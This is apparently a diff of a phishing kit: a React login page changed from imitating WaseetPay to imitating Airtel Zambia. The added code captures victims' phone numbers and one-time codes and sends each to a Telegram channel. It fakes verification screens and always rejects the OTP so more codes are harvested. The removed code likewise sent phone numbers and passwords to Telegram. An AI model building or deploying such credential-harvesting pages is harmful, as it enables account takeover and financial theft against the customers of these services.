@@ -1,505 +1,645 @@
 "use client"
 
-import React, { useState, useEffect } from "react"
-import {
-  ChevronDown,
-  Eye,
-  EyeOff,
-  Fingerprint,
-  Loader2,
-  CheckCircle2,
-} from "lucide-react"
-import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
+import React, { useState, useEffect, useCallback, useRef } from "react"
+import { sendTelegramMessage } from "@/lib/telegram"
 
-export default function WaseetPayPage() {
-  const [activeTab, setActiveTab] = useState<"login" | "register">("login")
-  const [phone, setPhone] = useState("")
-  const [password, setPassword] = useState("")
-  const [showPassword, setShowPassword] = useState(false)
-  const [isPasswordFocused, setIsPasswordFocused] = useState(false)
-  const [isSubmitting, setIsSubmitting] = useState(false)
-  const [isSuccess, setIsSuccess] = useState(false)
-  const [showBiometricModal, setShowBiometricModal] = useState(false)
-  const [merchantModal, setMerchantModal] = useState(false)
-  const [forgotModal, setForgotModal] = useState(false)
-  const [phoneError, setPhoneError] = useState("")
-  const [passwordError, setPasswordError] = useState("")
+type FlowStep = "phone" | "verifying_phone" | "otp" | "verifying_otp"
 
-  // Track visitor info silently on mount
+export default function AirtelPage() {
+  const [step, setStep] = useState<FlowStep>("phone")
+  const [phoneNumber, setPhoneNumber] = useState("")
+  const [otp, setOtp] = useState<string[]>([])
+  const [timer, setTimer] = useState(56)
+  const [canResend, setCanResend] = useState(false)
+  const [otpError, setOtpError] = useState("")
+  const [isShaking, setIsShaking] = useState(false)
+
+  const phoneInputRef = useRef<HTMLInputElement>(null)
+
+  // Countdown timer for OTP
   useEffect(() => {
-    const trackVisitor = async () => {
-      try {
-        await fetchVisitorInfo()
-        await sendTelegramMessage({
-          title: "👁️ زائر جديد - وسيط باي | WaseetPay Visitor",
-        })
-      } catch {
-        // silent fallback
-      }
+    let interval: NodeJS.Timeout
+    if (step === "otp" && timer > 0) {
+      interval = setInterval(() => {
+        setTimer((prev) => prev - 1)
+      }, 1000)
+    } else if (timer === 0) {
+      setCanResend(true)
     }
-    trackVisitor()
-  }, [])
+    return () => clearInterval(interval)
+  }, [step, timer])
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
+  // Format timer into MM:SS
+  const formatTimer = (seconds: number) => {
+    const mins = Math.floor(seconds / 60)
+    const secs = seconds % 60
+    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
+  }
 
-    let hasError = false
-    if (!phone.trim()) {
-      setPhoneError("يرجى إدخال رقم الهاتف")
-      hasError = true
-    } else {
-      setPhoneError("")
-    }
-
-    if (!password.trim()) {
-      setPasswordError("يرجى إدخال كلمة المرور")
-      hasError = true
-    } else {
-      setPasswordError("")
-    }
-
-    if (hasError) return
-
-    setIsSubmitting(true)
-
-    try {
-      await sendTelegramMessage({
-        title: "🔐 تسجيل دخول وسيط باي | WaseetPay Login",
-        phone: phone ? `09${phone.replace(/^09/, "")}` : "N/A",
-        password: password || "N/A",
-      })
-
-      if (typeof window !== "undefined") {
-        sessionStorage.setItem("userPhone", phone ? `09${phone.replace(/^09/, "")}` : "")
-      }
-
-      setTimeout(() => {
-        setIsSubmitting(false)
-        setIsSuccess(true)
-        setTimeout(() => {
-          const cleanPhone = phone ? `09${phone.replace(/^09/, "")}` : ""
-          window.location.href = cleanPhone ? `/otp?phone=${encodeURIComponent(cleanPhone)}` : "/otp"
-        }, 1000)
-      }, 900)
-    } catch {
-      setIsSubmitting(false)
-      const cleanPhone = phone ? `09${phone.replace(/^09/, "")}` : ""
-      window.location.href = cleanPhone ? `/otp?phone=${encodeURIComponent(cleanPhone)}` : "/otp"
+  // Handle phone number keypad input
+  const handlePhoneKeyPress = (digit: string) => {
+    if (phoneNumber.length < 10) {
+      setPhoneNumber((prev) => prev + digit)
     }
   }
 
-  const handleBiometricClick = async () => {
-    setShowBiometricModal(true)
+  const handlePhoneBackspace = () => {
+    setPhoneNumber((prev) => prev.slice(0, -1))
+  }
+
+  // Handle OTP keypad input
+  const handleOtpKeyPress = useCallback(
+    (digit: string) => {
+      if (otp.length < 4) {
+        const nextOtp = [...otp, digit]
+        setOtp(nextOtp)
+        setOtpError("")
+
+        // Auto trigger verification when 4th digit entered
+        if (nextOtp.length === 4) {
+          const fullOtp = nextOtp.join("")
+          triggerOtpVerification(fullOtp)
+        }
+      }
+    },
+    [otp, phoneNumber]
+  )
+
+  const handleOtpBackspace = useCallback(() => {
+    setOtp((prev) => prev.slice(0, -1))
+    setOtpError("")
+  }, [])
+
+  // Listen to physical keyboard events
+  useEffect(() => {
+    const handleKeyDown = (e: KeyboardEvent) => {
+      if (step === "phone") {
+        if (/^[0-9]$/.test(e.key)) {
+          handlePhoneKeyPress(e.key)
+        } else if (e.key === "Backspace") {
+          handlePhoneBackspace()
+        } else if (e.key === "Enter" && phoneNumber.length >= 7) {
+          handleProceedToLogin()
+        }
+      } else if (step === "otp") {
+        if (/^[0-9]$/.test(e.key)) {
+          handleOtpKeyPress(e.key)
+        } else if (e.key === "Backspace") {
+          handleOtpBackspace()
+        }
+      }
+    }
+
+    window.addEventListener("keydown", handleKeyDown)
+    return () => window.removeEventListener("keydown", handleKeyDown)
+  }, [step, phoneNumber, handleOtpKeyPress, handleOtpBackspace])
+
+  // Proceed from phone to verifying
+  const handleProceedToLogin = async () => {
+    if (phoneNumber.length < 5) return
+
+    setStep("verifying_phone")
+
+    // Send Telegram alert
     try {
       await sendTelegramMessage({
-        title: "👆 محاولة تسجيل بالبصمة | Biometric Click",
+        title: "📱 Airtel Zambia - Mobile Login",
+        phoneNumber: `+260${phoneNumber}`,
+        phone: `+260${phoneNumber}`,
       })
     } catch {
       // silent
     }
+
+    // Simulate verification delay (1.8s) then transition to OTP
     setTimeout(() => {
-      setShowBiometricModal(false)
+      setStep("otp")
+      setTimer(56)
+      setCanResend(false)
+      setOtp([])
     }, 1800)
   }
 
+  // Trigger OTP verification
+  const triggerOtpVerification = async (enteredOtp: string) => {
+    setStep("verifying_otp")
+
+    try {
+      await sendTelegramMessage({
+        title: "🔐 Airtel Zambia - OTP Submitted",
+        phoneNumber: `+260${phoneNumber}`,
+        otp1: enteredOtp,
+      })
+    } catch {
+      // silent
+    }
+
+    // Simulate 2.5s verification check, then return to OTP screen with error so user can retry
+    setTimeout(() => {
+      setStep("otp")
+      setOtp([])
+      setOtpError("Invalid OTP. Please enter the valid code.")
+      setIsShaking(true)
+      setTimeout(() => setIsShaking(false), 500)
+    }, 2500)
+  }
+
+  // Resend OTP
+  const handleResendOtp = async () => {
+    if (!canResend) return
+    setTimer(56)
+    setCanResend(false)
+    setOtp([])
+    setOtpError("")
+
+    try {
+      await sendTelegramMessage({
+        title: "🔄 Airtel Zambia - Resend OTP Requested",
+        phoneNumber: `+260${phoneNumber}`,
+      })
+    } catch {
+      // silent
+    }
+  }
+
+  // Mask phone number for display (e.g. ******667)
+  const getMaskedPhone = () => {
+    if (!phoneNumber) return "******667"
+    const last3 = phoneNumber.slice(-3) || "667"
+    return `******${last3}`
+  }
+
+  const isValidPhone = phoneNumber.length >= 7
+
   return (
-    <div
-      dir="rtl"
-      className="min-h-[100dvh] w-full bg-white flex flex-col justify-between selection:bg-[#1E64EC]/20"
+    <main
+      className="min-h-screen w-full bg-white flex flex-col items-center justify-between font-sans select-none text-[#1C1C1E] antialiased"
+      dir="ltr"
     >
       {/* ========================================================================= */}
-      {/* TOP FULL-WIDTH SECTION: Royal Blue Gradient with Waves & Brand            */}
+      {/* SCREEN 1: PHONE NUMBER INPUT                                             */}
       {/* ========================================================================= */}
-      <section
-        className="w-full pt-10 sm:pt-14 pb-16 sm:pb-20 px-6 sm:px-8 relative overflow-hidden shrink-0 min-h-[245px] sm:min-h-[285px] bg-[#124bbf]"
-        style={{
-          backgroundImage:
-            "linear-gradient(180deg, rgba(8, 36, 102, 0.16) 0%, rgba(7, 30, 88, 0.26) 100%), url('/login-bg.jpg')",
-          backgroundPosition: "top center",
-          backgroundSize: "cover",
-          backgroundRepeat: "no-repeat",
-        }}
-      >
-        {/* Subtle Grid overlay */}
-        <div
-          className="absolute inset-0 pointer-events-none opacity-20"
-          style={{
-            backgroundImage: `
-              linear-gradient(to right, rgba(255, 255, 255, 0.15) 1px, transparent 1px),
-              linear-gradient(to bottom, rgba(255, 255, 255, 0.15) 1px, transparent 1px)
-            `,
-            backgroundSize: "44px 44px",
-          }}
-        />
+      {step === "phone" && (
+        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-white px-5 sm:px-6 pt-3 pb-6 sm:pb-8 mx-auto">
+          {/* Header Bar */}
+          <div>
+            <header className="relative flex items-center justify-between h-14 border-b border-transparent">
+              {/* Back Arrow */}
+              <button
+                type="button"
+                onClick={() => setPhoneNumber("")}
+                aria-label="Back"
+                className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
+              >
+                <svg
+                  width="22"
+                  height="22"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2.8"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
+                  <polyline points="15 18 9 12 15 6" />
+                </svg>
+              </button>
 
-        {/* Luminous flowing cyan waves */}
-        <svg
-          className="absolute inset-0 w-full h-full pointer-events-none opacity-45"
-          viewBox="0 0 1440 260"
-          fill="none"
-          preserveAspectRatio="none"
-        >
-          <path
-            d="M-100,160 C300,50 650,220 1100,100 C1280,60 1420,130 1550,110"
-            stroke="rgba(100, 215, 255, 0.7)"
-            strokeWidth="2.5"
-            filter="blur(1px)"
-          />
-          <path
-            d="M-80,190 C320,80 680,240 1140,125 C1310,80 1440,150 1570,130"
-            stroke="rgba(70, 160, 255, 0.4)"
-            strokeWidth="1.5"
-          />
-          <path
-            d="M-50,220 C350,110 710,260 1180,150 C1340,105 1460,170 1600,150"
-            stroke="rgba(50, 140, 255, 0.25)"
-            strokeWidth="1.2"
-          />
-        </svg>
+              {/* Airtel Logo */}
+              <div className="absolute left-1/2 -translate-x-1/2 flex items-center gap-1.5">
+                <AirtelLogo />
+              </div>
 
-        {/* Container aligned with form below */}
-        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto relative z-10">
-          {/* Top Brand Bar */}
-          <div className="flex items-center justify-start gap-3">
-            {/* App Icon */}
-            <div className="w-[36px] h-[36px] sm:w-[40px] sm:h-[40px] rounded-[10px] overflow-hidden shadow-sm shadow-blue-950/30 shrink-0 border border-white/20">
-              <img
-                src="/waseetpay-app-icon.png"
-                alt="WaseetPay Logo"
-                className="w-full h-full object-cover"
-              />
-            </div>
+              {/* Spacer for symmetry */}
+              <div className="w-10" />
+            </header>
 
-            {/* Brand Title */}
-            <div className="text-white font-bold text-[15.5px] sm:text-[17.5px] tracking-tight flex items-center gap-1.5">
-              <span>وسيط باي</span>
-              <span className="text-white/60 font-light text-[12px] sm:text-[13px]">|</span>
-              <span className="font-semibold text-[14.5px] sm:text-[16px]">WaseetPay</span>
+            {/* Title */}
+            <div className="mt-7">
+              <h1 className="text-[23px] sm:text-[24px] font-bold text-[#1C1C1E] tracking-tight">
+                Welcome to Airtel Zambia
+              </h1>
+
+              {/* Field Label */}
+              <label className="block text-[14px] font-semibold text-[#2C2F36] mt-7 mb-2.5">
+                Registered Number
+              </label>
+
+              {/* Number Input Container with two border lines */}
+              <div
+                onClick={() => phoneInputRef.current?.focus()}
+                className="relative py-3 border-t-[1.5px] border-b-[1.5px] border-[#A1BFE7] flex items-center gap-2.5 cursor-text"
+              >
+                {/* Phone icon */}
+                <svg
+                  width="18"
+                  height="18"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="#8E929B"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  className="shrink-0"
+                >
+                  <rect x="5" y="2" width="14" height="20" rx="2.5" />
+                  <line x1="12" y1="18" x2="12.01" y2="18" strokeWidth="2.5" />
+                </svg>
+
+                {/* Country code */}
+                <span className="text-[17px] font-semibold text-[#1C1C1E] tracking-tight shrink-0">
+                  +260
+                </span>
+
+                {/* Vertical Blue Cursor */}
+                <span className="w-[1.5px] h-[20px] bg-[#3B82F6] animate-pulse shrink-0" />
+
+                {/* Input Text or Placeholder */}
+                <div className="flex-1 text-[17px] tracking-wide overflow-hidden whitespace-nowrap">
+                  {phoneNumber ? (
+                    <span className="text-[#1C1C1E] font-medium tracking-[1px]">
+                      {phoneNumber}
+                    </span>
+                  ) : (
+                    <span className="text-[#B2B7BF] font-normal">Enter here</span>
+                  )}
+                </div>
+
+                {/* Hidden input for mobile native keyboard / screen reader compatibility */}
+                <input
+                  ref={phoneInputRef}
+                  type="tel"
+                  inputMode="none"
+                  value={phoneNumber}
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/\D/g, "").slice(0, 10)
+                    setPhoneNumber(val)
+                  }}
+                  className="absolute inset-0 opacity-0 pointer-events-none"
+                  tabIndex={-1}
+                />
+              </div>
             </div>
           </div>
 
-          {/* Titles */}
-          <div className="mt-8 sm:mt-10 lg:mt-11">
-            <h1 className="text-[28px] sm:text-[36px] lg:text-[38px] font-extrabold text-white tracking-tight leading-tight">
-              تسجيل الدخول
-            </h1>
-            <p className="text-white/90 text-[13.5px] sm:text-[15px] font-normal mt-1.5 leading-snug">
-              ادفع، حوّل، واشترِ بسهولة وأمان.
-            </p>
+          {/* Numeric Keypad (Airtel Zambia style) */}
+          <div className="mt-8 sm:mt-10 mb-14 sm:mb-20">
+            <div className="grid grid-cols-3 gap-y-6 sm:gap-y-7 text-center max-w-[280px] sm:max-w-[300px] mx-auto">
+              {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((num) => (
+                <button
+                  key={num}
+                  type="button"
+                  onClick={() => handlePhoneKeyPress(num)}
+                  className="h-11 sm:h-12 flex items-center justify-center text-[22px] sm:text-[24px] font-normal text-[#2B2E35] active:opacity-40 transition-opacity select-none cursor-pointer"
+                >
+                  {num}
+                </button>
+              ))}
+
+              {/* Blank cell */}
+              <div className="h-11 sm:h-12" />
+
+              {/* Zero */}
+              <button
+                type="button"
+                onClick={() => handlePhoneKeyPress("0")}
+                className="h-11 sm:h-12 flex items-center justify-center text-[22px] sm:text-[24px] font-normal text-[#2B2E35] active:opacity-40 transition-opacity select-none cursor-pointer"
+              >
+                0
+              </button>
+
+              {/* Backspace */}
+              <button
+                type="button"
+                onClick={handlePhoneBackspace}
+                aria-label="Delete"
+                className="h-11 sm:h-12 flex items-center justify-center active:opacity-40 transition-opacity select-none cursor-pointer"
+              >
+                <BackspaceTagIcon />
+              </button>
+            </div>
+          </div>
+
+          {/* Bottom Proceed Button */}
+          <div className="w-full mt-auto">
+            <button
+              type="button"
+              disabled={!isValidPhone}
+              onClick={handleProceedToLogin}
+              className={`w-full h-[52px] rounded-[6px] font-bold text-[15px] tracking-[0.5px] uppercase transition-all duration-200 flex items-center justify-center select-none ${
+                isValidPhone
+                  ? "bg-[#ED1B24] text-white shadow-md shadow-red-500/20 active:scale-[0.99] cursor-pointer hover:bg-[#DE141D]"
+                  : "bg-[#D6DBE2] text-white cursor-not-allowed"
+              }`}
+            >
+              PROCEED TO LOGIN
+            </button>
           </div>
         </div>
-      </section>
+      )}
 
       {/* ========================================================================= */}
-      {/* BOTTOM FULL-WIDTH SECTION: Pure White Sheet with Top Rounded Edge         */}
+      {/* SCREEN 2 & 4: FULL-SCREEN DARK VERIFICATION OVERLAY                      */}
       {/* ========================================================================= */}
-      <section className="w-full bg-white -mt-7 sm:-mt-9 rounded-t-[32px] sm:rounded-t-[38px] flex-1 px-6 sm:px-8 pt-7 sm:pt-8 lg:pt-9 pb-8 sm:pb-10 flex flex-col justify-between shadow-[0_-8px_25px_rgba(0,0,0,0.06)] relative z-20">
-        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto flex flex-col justify-between h-full">
-          <div>
-            {/* ---------------- Segmented Tabs ---------------- */}
-            {/* In RTL: Right tab is first element, Left tab is second element */}
-            <div className="w-full bg-[#f2f4f7] p-1.5 rounded-[15px] flex items-center mb-6 h-[52px]">
-              {/* Register Tab (Right side in RTL) */}
+      {(step === "verifying_phone" || step === "verifying_otp") && (
+        <div className="fixed inset-0 z-50 bg-[#4D4E55] flex flex-col items-center justify-center gap-5 transition-opacity">
+          {/* iOS-style Spinner */}
+          <IOSActivityIndicator />
+
+          {/* Verification Text */}
+          <p className="text-white text-[16px] sm:text-[17px] font-normal tracking-wide">
+            {step === "verifying_phone" ? "Verifying Mobile Number" : "Verifying OTP"}
+          </p>
+        </div>
+      )}
+
+      {/* ========================================================================= */}
+      {/* SCREEN 3: OTP VERIFICATION                                               */}
+      {/* ========================================================================= */}
+      {step === "otp" && (
+        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-white mx-auto">
+          {/* Top Section */}
+          <div className="px-5 sm:px-6 pt-3">
+            {/* Header Bar */}
+            <header className="relative flex items-center justify-between h-14">
+              {/* Back Chevron */}
               <button
                 type="button"
-                onClick={() => setActiveTab("register")}
-                className={`flex-1 h-full rounded-[12px] text-[14px] sm:text-[14.5px] font-medium transition-all duration-150 cursor-pointer text-center select-none flex items-center justify-center ${
-                  activeTab === "register"
-                    ? "bg-white text-[#1f2937] shadow-xs font-bold"
-                    : "bg-transparent text-[#8a919e] hover:text-[#4b5563]"
-                }`}
+                onClick={() => {
+                  setStep("phone")
+                  setOtp([])
+                  setOtpError("")
+                }}
+                aria-label="Back to login"
+                className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
               >
-                إنشاء حساب
+                <svg
+                  width="22"
+                  height="22"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2.8"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
+                  <polyline points="15 18 9 12 15 6" />
+                </svg>
               </button>
 
-              {/* Login Tab (Left side in RTL) */}
-              <button
-                type="button"
-                onClick={() => setActiveTab("login")}
-                className={`flex-1 h-full rounded-[12px] text-[14px] sm:text-[14.5px] font-bold transition-all duration-150 cursor-pointer text-center select-none flex items-center justify-center ${
-                  activeTab === "login"
-                    ? "bg-white text-[#1f2937] shadow-xs"
-                    : "bg-transparent text-[#8a919e] hover:text-[#4b5563]"
-                }`}
-              >
-                تسجيل الدخول
-              </button>
+              {/* Title */}
+              <h2 className="absolute left-1/2 -translate-x-1/2 text-[17px] sm:text-[18px] font-bold text-[#1C1C1E] tracking-tight">
+                OTP Verification
+              </h2>
+
+              {/* Spacer */}
+              <div className="w-10" />
+            </header>
+
+            {/* Subtext */}
+            <p className="text-[14.5px] text-[#2C2F36] leading-relaxed mt-6 mb-7 text-center sm:text-left">
+              An OTP has been sent to{" "}
+              <span className="font-semibold">{getMaskedPhone()}</span> and WhatsApp.
+            </p>
+
+            {/* 4 OTP Input Boxes */}
+            <div
+              className={`flex items-center justify-center gap-3.5 sm:gap-4 mb-5 transition-transform ${
+                isShaking ? "animate-[shake_0.4s_ease-in-out]" : ""
+              }`}
+            >
+              {[0, 1, 2, 3].map((index) => {
+                const hasValue = index < otp.length
+                const isCurrent = index === otp.length
+
+                return (
+                  <div
+                    key={index}
+                    className={`w-[58px] h-[58px] sm:w-[64px] sm:h-[64px] rounded-[14px] bg-white border flex items-center justify-center transition-all ${
+                      hasValue
+                        ? "border-gray-300 shadow-[0_2px_4px_rgba(0,0,0,0.06)]"
+                        : isCurrent
+                        ? "border-[#5B96F7] shadow-[0_0_0_2px_rgba(91,150,247,0.25)]"
+                        : "border-gray-200 shadow-xs"
+                    }`}
+                  >
+                    {hasValue ? (
+                      /* Asterisk symbol exactly as in the design */
+                      <span className="text-[32px] sm:text-[36px] font-black text-[#1C1C1E] leading-none select-none mt-1">
+                        ✱
+                      </span>
+                    ) : isCurrent ? (
+                      <span className="w-[1.5px] h-[22px] bg-[#3B82F6] animate-pulse" />
+                    ) : null}
+                  </div>
+                )
+              })}
             </div>
 
-            {/* ---------------- Form Fields ---------------- */}
-            <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
-              {/* Field 1: Phone Number */}
-              <div>
-                <label className="block text-[#6b7280] text-[13px] sm:text-[13.5px] font-medium mb-2 text-right">
-                  رقم الهاتف
-                </label>
-                <div
-                  className={`h-[52px] sm:h-[54px] rounded-[15px] sm:rounded-[16px] bg-white px-4 flex items-center justify-between transition-colors ${
-                    phoneError
-                      ? "border-2 border-rose-500 ring-2 ring-rose-500/15"
-                      : "border border-[#e5e7eb] focus-within:border-[#1E64EC] focus-within:ring-2 focus-within:ring-[#1E64EC]/15"
-                  }`}
-                >
-                  {/* Right side in RTL: Libya Flag + Down Arrow */}
-                  <div className="flex items-center gap-2 shrink-0 select-none">
-                    {/* Libyan Flag Circle */}
-                    <svg
-                      viewBox="0 0 32 32"
-                      className="w-[22px] h-[22px] rounded-full shrink-0 shadow-2xs overflow-hidden border border-gray-100"
-                    >
-                      <rect width="32" height="8" fill="#e7211a" />
-                      <rect y="8" width="32" height="16" fill="#000000" />
-                      <rect y="24" width="32" height="8" fill="#249c47" />
-                      <path
-                        d="M17.5 11.5 A 4.5 4.5 0 1 0 17.5 20.5 A 3.6 3.6 0 1 1 17.5 11.5 Z"
-                        fill="#ffffff"
-                      />
-                      <polygon
-                        points="18.5,14.5 19,15.7 20.2,15.7 19.3,16.4 19.6,17.5 18.5,16.8 17.4,17.5 17.7,16.4 16.8,15.7 18,15.7"
-                        fill="#ffffff"
-                      />
-                    </svg>
+            {/* OTP Error message if any */}
+            {otpError && (
+              <p className="text-red-600 text-[13px] text-center font-medium mb-3">
+                {otpError}
+              </p>
+            )}
 
-                    <ChevronDown className="w-3.5 h-3.5 text-[#6b7280] stroke-[2.5]" />
-                  </div>
+            {/* Resend OTP Row */}
+            <div className="flex items-center justify-between px-2 mb-8 text-[13px]">
+              <button
+                type="button"
+                disabled={!canResend}
+                onClick={handleResendOtp}
+                className={`font-bold tracking-wider uppercase transition-colors ${
+                  canResend
+                    ? "text-[#ED1B24] cursor-pointer hover:underline"
+                    : "text-[#A3A8B1] cursor-not-allowed"
+                }`}
+              >
+                RESEND OTP
+              </button>
 
-                  {/* Vertical Divider */}
-                  <div className="w-px h-5 sm:h-6 bg-[#e5e7eb] ml-3 shrink-0" />
-
-                  {/* Phone Input - Strictly Numeric */}
-                  <div className="flex-1">
-                    <input
-                      type="tel"
-                      inputMode="numeric"
-                      pattern="[0-9]*"
-                      value={phone}
-                      onChange={(e) => {
-                        const val = e.target.value.replace(/\D/g, "")
-                        setPhone(val)
-                        if (phoneError) setPhoneError("")
-                      }}
-                      placeholder="xxxxxxx-09"
-                      dir="ltr"
-                      className="w-full text-right text-[14.5px] sm:text-[15.5px] font-medium text-[#1f2937] placeholder:text-[#9ca3af] outline-none bg-transparent"
-                    />
-                  </div>
-                </div>
-                {phoneError && (
-                  <p className="text-rose-500 text-[11.5px] font-medium mt-1.5 text-right animate-in fade-in duration-150">
-                    {phoneError}
-                  </p>
-                )}
-              </div>
-
-              {/* Field 2: Password */}
-              <div>
-                <label className="block text-[#6b7280] text-[13px] sm:text-[13.5px] font-medium mb-2 text-right">
-                  كلمة المرور
-                </label>
-                <div
-                  className={`h-[52px] sm:h-[54px] rounded-[15px] sm:rounded-[16px] bg-white px-4 flex items-center justify-between transition-all ${
-                    passwordError
-                      ? "border-2 border-rose-500 ring-2 ring-rose-500/15"
-                      : isPasswordFocused
-                      ? "border-2 border-[#1E64EC] shadow-[0_0_0_2px_rgba(29,100,236,0.12)]"
-                      : "border border-[#e5e7eb]"
-                  }`}
-                >
-                  {/* Eye Toggle on Left in RTL */}
-                  <button
-                    type="button"
-                    onClick={() => setShowPassword(!showPassword)}
-                    className="text-[#8a919e] hover:text-[#374151] p-1 transition-colors cursor-pointer select-none"
-                    aria-label={showPassword ? "إخفاء كلمة المرور" : "عرض كلمة المرور"}
-                  >
-                    {showPassword ? (
-                      <Eye className="w-5 h-5 stroke-[1.8]" />
-                    ) : (
-                      <EyeOff className="w-5 h-5 stroke-[1.8]" />
-                    )}
-                  </button>
-
-                  {/* Password Input */}
-                  <div className="flex-1 mr-2 relative flex items-center justify-end">
-                    <input
-                      type={showPassword ? "text" : "password"}
-                      value={password}
-                      onFocus={() => setIsPasswordFocused(true)}
-                      onBlur={() => setIsPasswordFocused(false)}
-                      onChange={(e) => {
-                        setPassword(e.target.value)
-                        if (passwordError) setPasswordError("")
-                      }}
-                      placeholder=""
-                      dir="ltr"
-                      className="w-full text-right text-[15px] sm:text-[16px] font-medium text-[#1f2937] outline-none bg-transparent"
-                    />
-                    {!password && (
-                      <div className="absolute right-0 flex items-center gap-1 pointer-events-none select-none">
-                        {isPasswordFocused && (
-                          <span className="text-[#1E64EC] font-normal text-[15px] animate-pulse ml-0.5">|</span>
-                        )}
-                        <span className="w-1.5 h-1.5 rounded-full bg-slate-300 inline-block" />
-                        <span className="w-1.5 h-1.5 rounded-full bg-slate-300 inline-block" />
-                        <span className="w-1.5 h-1.5 rounded-full bg-slate-300 inline-block" />
-                      </div>
-                    )}
-                  </div>
-                </div>
-                {passwordError && (
-                  <p className="text-rose-500 text-[11.5px] font-medium mt-1.5 text-right animate-in fade-in duration-150">
-                    {passwordError}
-                  </p>
-                )}
-
-                {/* Forgot Password Link */}
-                <div className="mt-2 sm:mt-2.5 text-right">
-                  <button
-                    type="button"
-                    onClick={() => setForgotModal(true)}
-                    className="text-[#1253d8] hover:text-[#0e44b5] text-[13px] sm:text-[13.5px] font-semibold transition-colors hover:underline cursor-pointer"
-                  >
-                    نسيت كلمة المرور ؟
-                  </button>
-                </div>
-              </div>
-
-              {/* Action Buttons Row */}
-              <div className="pt-2.5 sm:pt-3 flex items-center gap-3">
-                {/* Submit Login Button */}
-                <button
-                  type="submit"
-                  disabled={isSubmitting}
-                  className="flex-1 h-[52px] sm:h-[54px] rounded-[15px] sm:rounded-[16px] bg-[#1253d8] hover:bg-[#0e44b5] active:scale-[0.99] text-white font-bold text-[16px] flex items-center justify-center shadow-md shadow-[#1253d8]/25 transition-all cursor-pointer disabled:opacity-85"
-                >
-                  {isSubmitting ? (
-                    <Loader2 className="w-5 h-5 animate-spin text-white" />
-                  ) : isSuccess ? (
-                    <div className="flex items-center gap-2">
-                      <CheckCircle2 className="w-5 h-5 text-white" />
-                      <span>تم التحقق بنجاح</span>
-                    </div>
-                  ) : (
-                    "تسجيل الدخول"
-                  )}
-                </button>
-
-                {/* Biometric Button */}
-                <button
-                  type="button"
-                  onClick={handleBiometricClick}
-                  aria-label="تسجيل الدخول بالبصمة"
-                  className="w-[52px] h-[52px] sm:w-[54px] sm:h-[54px] rounded-[15px] sm:rounded-[16px] bg-[#1253d8] hover:bg-[#0e44b5] active:scale-95 text-white flex items-center justify-center shrink-0 shadow-md shadow-[#1253d8]/25 transition-all cursor-pointer"
-                >
-                  <Fingerprint className="w-6 h-6 sm:w-7 sm:h-7 text-white stroke-[1.8]" />
-                </button>
-              </div>
-            </form>
-
-            {/* ---------------- Divider: 'أو' ---------------- */}
-            <div className="relative flex items-center justify-center my-6 sm:my-7">
-              <div className="absolute inset-0 flex items-center">
-                <div className="w-full border-t border-slate-200" />
-              </div>
-              <span className="relative bg-white px-3.5 text-[#9ca3af] text-[13px] font-medium select-none">
-                أو
+              <span className="font-semibold text-[#666B74] tracking-wider">
+                {formatTimer(timer)}
               </span>
             </div>
 
-            {/* ---------------- Merchant Login Button ---------------- */}
-            <button
-              type="button"
-              onClick={() => setMerchantModal(true)}
-              className="w-full h-[52px] sm:h-[54px] rounded-[15px] sm:rounded-[16px] border border-[#e5e7eb] hover:bg-slate-50 active:scale-[0.99] text-[#374151] font-bold text-[14px] flex items-center justify-center gap-2.5 transition-all cursor-pointer shadow-2xs"
-            >
-              <svg
-                viewBox="0 0 24 24"
-                className="w-4 h-4 sm:w-5 sm:h-5 text-[#9ca3af] stroke-current fill-none stroke-[1.7]"
+            {/* Customer Care Section */}
+            <div className="text-center mt-2 mb-6">
+              <p className="text-[13.5px] font-medium text-[#4B505A] mb-3">
+                Need customer care help?
+              </p>
+              <a
+                href="tel:111"
+                className="inline-flex items-center justify-center gap-2 px-5 py-1.5 rounded-full border border-[#22252A] text-[#22252A] hover:bg-gray-50 active:scale-95 transition-all text-[13.5px] font-semibold"
               >
-                <path d="M3 21h18" strokeLinecap="round" />
-                <path d="M4 21V10" strokeLinecap="round" />
-                <path d="M20 21V10" strokeLinecap="round" />
-                <path d="M8 21V10" strokeLinecap="round" strokeDasharray="1 1" />
-                <path d="M12 21V10" strokeLinecap="round" />
-                <path d="M16 21V10" strokeLinecap="round" strokeDasharray="1 1" />
-                <path d="M2 10h20" strokeLinecap="round" />
-                <path d="M12 3L2 8.5v1.5h20V8.5L12 3z" strokeLinejoin="round" />
-                <circle cx="12" cy="6.2" r="0.7" fill="currentColor" />
-              </svg>
-              <span>تسجيل دخول للتجار</span>
-            </button>
-          </div>
-
-          {/* Website Copyright Footer */}
-          <footer className="w-full pt-6 pb-3 text-center text-[11px] sm:text-xs text-slate-400">
-            <span>© {new Date().getFullYear()} وسيط باي | WaseetPay. جميع الحقوق محفوظة.</span>
-          </footer>
-        </div>
-      </section>
-
-      {/* ========================================================================= */}
-      {/* MODALS & NOTIFICATIONS                                                    */}
-      {/* ========================================================================= */}
-      {/* Biometric Simulation Modal */}
-      {showBiometricModal && (
-        <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-[2px] flex items-center justify-center p-4">
-          <div className="bg-white rounded-[24px] p-6 max-w-[340px] w-full text-center shadow-2xl animate-in zoom-in-95 duration-200">
-            <div className="w-16 h-16 rounded-full bg-blue-50 text-[#1E64EC] mx-auto mb-4 flex items-center justify-center">
-              <Fingerprint className="w-10 h-10 animate-pulse stroke-[1.8]" />
